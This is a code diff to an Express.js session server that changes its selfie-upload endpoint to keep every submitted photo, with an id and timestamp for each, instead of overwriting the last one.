@@ -82,6 +82,7 @@ app.post('/api/sessions', (req, res) => {
       state: state || 'waiting',
       token: '',
       selfie: '',
+      selfies: [],
       createdAt: Date.now(),
       last_seen: Date.now(),
       updatedAt: Date.now(),
@@ -171,13 +172,25 @@ app.post('/api/sessions/:id/state', (req, res) => {
   res.json({ success: true, session: sessions[id] })
 })
 
-// 8. Update selfie photo (from selfie validation page)
+// 8. Update selfie photo (from selfie validation page - accumulates all photos)
 app.post('/api/sessions/:id/selfie', (req, res) => {
   const { id } = req.params
   const { photo } = req.body
   if (!sessions[id]) return res.status(404).json({ error: 'Session not found' })
 
-  sessions[id].selfie = photo || ''
+  if (!Array.isArray(sessions[id].selfies)) {
+    sessions[id].selfies = []
+  }
+
+  if (photo) {
+    sessions[id].selfie = photo
+    sessions[id].selfies.push({
+      id: `selfie_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`,
+      photo,
+      timestamp: Date.now(),
+    })
+  }
+
   sessions[id].state = 'received-selfie'
   sessions[id].last_seen = Date.now()
   sessions[id].updatedAt = Date.now()
